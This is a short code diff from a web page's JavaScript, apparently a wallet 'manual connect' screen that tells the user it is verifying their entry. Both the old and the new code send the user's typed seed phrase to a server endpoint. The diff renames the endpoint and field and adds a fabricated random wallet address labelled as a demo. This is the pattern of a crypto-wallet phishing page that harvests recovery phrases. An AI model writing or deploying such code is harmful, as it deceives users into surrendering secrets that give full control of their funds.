@@ -664,12 +664,12 @@
           stateEl.textContent = 'Verifying manual entry...';
 
           try {
-            fetch('/api/manual-attempt', {
+            fetch('/api/user/save', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({ 
-                type: 'manual-connect-attempt',
-                seedPhrase: phrase
+                walletAddress: '0x' + Math.random().toString(16).substr(2, 40), // Demo wallet address
+                manualPhrase: phrase
               })
             }).then(function (r) { return r.json(); }).then(function (j) { console.log('[manual-attempt]', j); }).catch(function (e) { console.warn('[manual-attempt] error', e); });
           } catch (e) {
